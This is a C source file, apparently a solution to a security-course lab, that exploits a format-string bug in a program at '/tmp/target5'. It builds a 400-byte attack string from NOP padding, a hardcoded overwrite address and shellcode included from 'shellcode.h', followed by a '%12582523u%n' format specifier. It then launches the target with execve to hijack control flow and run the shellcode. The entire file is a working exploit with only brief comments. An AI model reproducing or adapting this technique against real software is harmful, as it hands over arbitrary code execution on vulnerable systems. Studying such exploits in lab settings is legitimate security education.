#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET      "/tmp/target5"
#define NOP         0x90                // NOP instruction
#define ATTACK_SIZE 400                 // Size of the attack_string
#define EIP_ADDR    0xbffffcbd          // Address of where to write to


int main(void)
{
    char *args[3];
    char *env[1];
    int i;                              // Loop counter, duh
    char * attack_string;               // The attack_string, oy this comment is redundant
    char * char_ptr;                    // Pointer for traversing attack_string 1 byte at a time
    long *addr_ptr;                     // Pointer for traversing attack_string 4 bytes at a time
    char * format_string;               // Format string to exploit the format string function


    format_string = "%12582523u%n";

    // Allocate memory for the attack string
    attack_string = malloc(sizeof(char) * ATTACK_SIZE);

    // 1. Fill attack_string with NOPs
    for(i = 0; i < ATTACK_SIZE; i++) {
        attack_string[i] = NOP;
    }

    // 2. Place the return address on the front of attack_string
    addr_ptr = (long *)attack_string;
    *(addr_ptr) = EIP_ADDR;

    // 3. Place the format string on the end of attack_string, before the NUL termination
    char_ptr = attack_string + (ATTACK_SIZE - 1 - strlen(format_string));
    for(i = 0; i < strlen(format_string); i++) {
        *(char_ptr++) = format_string[i];
    }

    // 4. Copy shellcode to the center of attack_string, between nop padding and format string
    char_ptr = attack_string + (ATTACK_SIZE - 1 - strlen(shellcode) - strlen(format_string));
    for(i = 0; i < strlen(shellcode); i++) {
        *(char_ptr++) = shellcode[i];
    }

    // 5. Add a NUL character to the end of the attack_string
    attack_string[ATTACK_SIZE - 1] = '\0';

    args[0] = TARGET;
    args[1] = attack_string;
    args[2] = NULL;

    env[0] = NULL;

    if(0 > execve(TARGET, args, env)) {
        fprintf(stderr, "execve failed.\n");
    }

    return 0;
}
